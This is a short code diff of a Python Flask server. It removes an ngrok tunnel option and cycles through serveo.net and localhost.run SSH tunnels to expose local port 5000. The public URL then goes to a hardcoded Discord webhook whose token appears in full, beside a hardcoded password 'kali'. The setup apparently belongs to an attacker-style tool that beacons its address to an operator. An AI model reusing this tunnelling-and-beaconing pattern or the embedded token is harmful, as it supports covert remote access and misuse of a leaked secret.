@@ -6,7 +6,6 @@ from flask import Flask, render_template, request, jsonify, send_file, Response,
 from flask_socketio import SocketIO, emit
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1516834045026369709/523I42gDEz_0P1WKwi2-q8oNCUNLzulgF2AS749llpNJGsCNvaB9x59fdq8xalKgZGkN"
-NGROK_AUTH_TOKEN = ""
 PORT = 5000
 PASSWORD = "kali"
 
@@ -441,26 +440,13 @@ def tunnel_ssh(domain):
         print(f"[-] {domain} error: {e}")
         return None
 
-def tunnel_ngrok():
-    global tunnel_url, tunnel_urls
-    if tunnel_url: return tunnel_url
-    print("[*] Tentative ngrok...")
-    try:
-        subprocess.Popen(["ngrok", "http", str(PORT), "--log", "stdout"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(3)
-        r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
-        url = r.json()["tunnels"][0]["public_url"]
-        if url: tunnel_url = url; tunnel_urls.append(url)
-        print(f"[+] Ngrok URL: {url}"); return url
-    except:
-        return None
-
 def start_tunnel():
     global tunnel_url, tunnel_urls
     tunnel_urls = []
-    tunnel_url = tunnel_ssh("serveo.net")
-    if tunnel_url: return tunnel_url
-    return tunnel_ngrok()
+    for domain in ["serveo.net", "localhost.run"]:
+        tunnel_url = tunnel_ssh(domain)
+        if tunnel_url: return tunnel_url
+    return None
 
 def send_webhook(url, extra_urls=None):
     try:
